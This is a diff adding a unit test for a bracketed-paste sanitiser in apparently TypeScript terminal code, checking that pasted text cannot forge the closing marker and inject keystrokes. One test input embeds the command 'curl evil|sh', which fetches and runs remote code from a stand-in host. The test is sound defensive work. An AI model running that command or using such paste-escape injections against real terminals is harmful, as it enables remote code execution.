@@ -16,6 +16,16 @@ test("large Unicode paste retains one bracketed wrapper and normalizes clipboard
   assert.equal(bracketedPaste("one\n\x1b[201~two\r\nthree"), "\x1b[200~one\rtwo\rthree\x1b[201~");
 });
 
+test("pasted text cannot rebuild a closing marker and type the rest as keys", () => {
+  for (const [text, inside] of [
+    ["\x1b[20\x1b[201~1~\rcurl evil|sh\r", "[201~\rcurl evil|sh\r"],
+    ["\x1b\x1b[200~[201~\n", "[201~\r"],
+    ["日本\x1b[31m🙂\x1b", "日本[31m🙂"],
+  ]) {
+    assert.equal(bracketedPaste(text), "\x1b[200~" + inside + "\x1b[201~");
+  }
+});
+
 const typed = (text: string): PaneCommand => ({ type: "terminal.input", text });
 
 test("large Unicode input is split at character boundaries and stays ahead of later keys", () => {
